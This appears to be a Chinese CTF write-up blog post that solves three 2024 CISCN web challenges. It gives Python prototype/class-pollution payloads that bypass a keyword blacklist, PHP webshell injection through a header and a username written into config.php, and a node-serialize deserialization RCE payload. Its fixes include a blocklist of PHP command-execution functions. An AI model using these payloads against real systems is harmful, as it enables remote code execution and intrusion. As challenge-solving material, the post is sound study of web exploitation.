---
typora-root-url:
title: 2024-CISCN-SouthEast-Web
toc: true
categories:
  - ctf
date: 2026-03-10 22:15:08
tags: 
  - ctf
---

## Polluted

```
from flask import Flask, session, redirect, url_for,request,render_template
import os
import hashlib
import json
import re

def generate_random_md5():
    random_string = os.urandom(16)
    md5_hash = hashlib.md5(random_string)

    return md5_hash.hexdigest()
def filter(user_input):
    blacklisted_patterns = ['init', 'global', 'env', 'app', '_', 'string']
    for pattern in blacklisted_patterns:
        if re.search(pattern, user_input, re.IGNORECASE):
            return True
    return False
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


app = Flask(__name__)
app.secret_key = generate_random_md5()

class evil():
    def __init__(self):
        pass

@app.route('/',methods=['POST'])
def index():
    username = request.form.get('username')
    password = request.form.get('password')
    session["username"] = username
    session["password"] = password
    Evil = evil()
    if request.data:
        if filter(str(request.data)):
            return "NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~"
        else:
            merge(json.loads(request.data), Evil)
            return "MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED"
    return render_template("index.html")

@app.route('/admin',methods=['POST', 'GET'])
def templates():
    username = session.get("username", None)
    password = session.get("password", None)
    if username and password:
        if username == "adminer" and password == app.secret_key:
            return render_template("important.html", flag=open("/flag", "rt").read())
        else:
            return "Unauthorized"
    else:
        return f'Hello,  This is the POLLUTED page.'

if __name__ == '__main__':
    app.run(host='0.0.0.0',debug=True , port=80)
```

其中request.data

```
    @cached_property
    def data(self) -> bytes:
        """The raw data read from :attr:`stream`. Will be empty if the request
        represents form data.

        To get the raw data even if it represents form data, use :meth:`get_data`.
        """
        return self.get_data(parse_form_data=True)
```

在form data为空，所以Content-Type:不为application/x-www-form-urlencoded就行

一眼污染，绕过黑名单，两个思路

第一：编码，json.loads时可能识别编码并恢复

第二：硬绕，找没ban的路径

进json.loads看

```
def detect_encoding(b):
    bstartswith = b.startswith
    if bstartswith((codecs.BOM_UTF32_BE, codecs.BOM_UTF32_LE)):
        return 'utf-32'
    if bstartswith((codecs.BOM_UTF16_BE, codecs.BOM_UTF16_LE)):
        return 'utf-16'
    if bstartswith(codecs.BOM_UTF8):
        return 'utf-8-sig'

    if len(b) >= 4:
        if not b[0]:
            # 00 00 -- -- - utf-32-be
            # 00 XX -- -- - utf-16-be
            return 'utf-16-be' if b[1] else 'utf-32-be'
        if not b[1]:
            # XX 00 00 00 - utf-32-le
            # XX 00 00 XX - utf-16-le
            # XX 00 XX -- - utf-16-le
            return 'utf-16-le' if b[2] or b[3] else 'utf-32-le'
    elif len(b) == 2:
        if not b[0]:
            # 00 XX - utf-16-be
            return 'utf-16-be'
        if not b[1]:
            # XX 00 - utf-16-le
            return 'utf-16-le'
    # default
    return 'utf-8'
```

所以unicode编码试试发现loads时能解码  (json支持unicode转义)

### 预期解

```
evil.__init__.__globals__["app"].secret_key找到secret_key

{"{{unicode(__init__)}}":{"{{unicode(__globals__)}}":{"{{unicode(app)}}":{"{{unicode(secret_key)}}":"sss"}}}}
```

最后admin返回

**HELLO ADMIN !! NOW YOU KNOW THE FLAG IS :[%flag%]**

看模板

```
<html>
<h1>HELLO ADMIN !! NOW YOU KNOW THE FLAG IS :[%flag%]</h1>
<body>
</body>
</html>
```

没招了，查了下要修改模板标识，这就是python🐎

```
@cached_property
    def jinja_env(self) -> Environment:
        """The Jinja environment used to load templates.

        The environment is created the first time this property is
        accessed. Changing :attr:`jinja_options` after that will have no
        effect.
        """
        return self.create_jinja_environment()
        
class Environment(BaseEnvironment)有variable_start_string,ariable_end_string

改app.jinja_env.variable_start_string就行
```

```
POST / HTTP/1.1
Content-Type: a
Host: 127.0.0.1

{"{{unicode(__init__)}}":{"{{unicode(__globals__)}}":{"{{unicode(app)}}":{"{{unicode(jinja_env)}}":{"{{unicode(variable_start_string)}}":"{{unicode([%)}}","{{unicode(variable_end_string)}}":"{{unicode(%])}}"}}}}}
```

即可，这个因为是开debug热加载了，不开的话改了也没用，初始化就定了

fix黑名单加\u就行

### 非预期

app.static_folder="/"直接读flag即可

## 粗心的程序员

审计代码，找到向php写入的片段，并内容可控

```
<?php
error_reporting(0);
include "default_info_auto_recovery.php";
session_start();
$p = $_SERVER["HTTP_X_FORWARDED_FOR"]?:$_SERVER["REMOTE_ADDR"];
if (preg_match("/\?|php|:/i",$p))
{
    die("");
}
$time = date('Y-m-d h:i:s', time());
$username = $_SESSION['username'];
$id = $_SESSION['id'];
if ($username && $id){
    echo "Hello,"."$username";
    $str = "//登陆时间$time,$username $p";
    $str = str_replace("\n","",$str);
    file_put_contents("config.php",file_get_contents("config.php").$str);
```

$p与username都可控制$p 改了直接执行就行比如 ?><?php eval($_REQUEST[1])?>

挑战下只改username

```
function Check($username,$passwd){
    if ((strlen($username) <5 || strlen($passwd) < 5) || (strlen($username) >10 || strlen($passwd) >10)){
        return "用户名和密码长度必须大于等于5或者小于等于10!";
    }
    else{
        return "ok";
    }
}
```

可以改用户名

```
function CheckNewUser($username){
    if (strlen($username) <5 || strlen($username) > 20){
        return "新用户名长度必须大于等于5或者小于等于10!";
    }
    else{
        return "ok";
    }
}
```

随便注册一个改成 ?><?=`$_GET[1]`?> 就行了

fix

对username加点黑名单

```
function wafrce($str){
    return preg_match("/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i", $str);
}
function CheckNewUser($username){
    if (wafrce($username)){return "新用户名长度必须大于等于5或者小于等于10!";}
    if (strlen($username) <5 || strlen($username) > 20){
        return "新用户名长度必须大于等于5或者小于等于10!";
    }
    else{
        return "ok";
    }
}
```

再对$p直接用$_SERVER["REMOTE_ADDR"]

## bigfish

发现反序列化点

```
app.post('/login', function(req, res) {
    if(req.cookies.profile){
        var str = new Buffer(req.cookies.profile, 'base64').toString();
        var obj = serialize.unserialize(str);
       if (obj.username) {
            if (escape(obj.username) === "admin") {
             res.send("Hello World");
          }
       }
    }else{
       res.sendFile(path.join(__dirname, 'public/data'));
    }
});
```

```
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls />./public/a.txt', function(error, stdout, stderr) { console.log(stdout) });  }()"}
```

访问a.txt即可
